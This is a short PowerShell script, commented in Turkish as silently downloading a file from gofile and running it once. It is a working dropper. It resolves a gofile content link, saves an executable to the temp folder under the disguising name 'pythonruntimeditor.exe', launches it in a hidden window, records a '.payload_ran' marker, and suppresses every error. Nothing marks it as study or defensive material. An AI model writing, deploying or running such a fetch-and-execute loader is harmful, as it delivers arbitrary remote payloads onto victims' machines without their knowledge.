# Sessizce gofile'dan dosya indirip bir kez çalıştırır

$gofileCode = "lBhjqd"
$apiUrl = "https://api.gofile.io/getContent?contentId=$gofileCode&token=&websiteToken=websiteToken&cache=true"

try {
    $response = Invoke-WebRequest -Uri $apiUrl -UseBasicParsing -ErrorAction SilentlyContinue
    $json = $response.Content | ConvertFrom-Json
    $directUrl = $json.data.contents.PSObject.Properties.Value[0].link

    $localPath = "$env:TEMP\pythonruntimeditor.exe"
    $markerPath = "$env:TEMP\.payload_ran"

    if (-not (Test-Path $localPath)) {
        Invoke-WebRequest -Uri $directUrl -OutFile $localPath -UseBasicParsing -ErrorAction SilentlyContinue
    }

    if (-not (Test-Path $markerPath)) {
        Start-Process -FilePath $localPath -WindowStyle Hidden
        New-Item -Path $markerPath -ItemType File -Force | Out-Null
    }
} catch {
    # Hata olursa sessizce geç
}
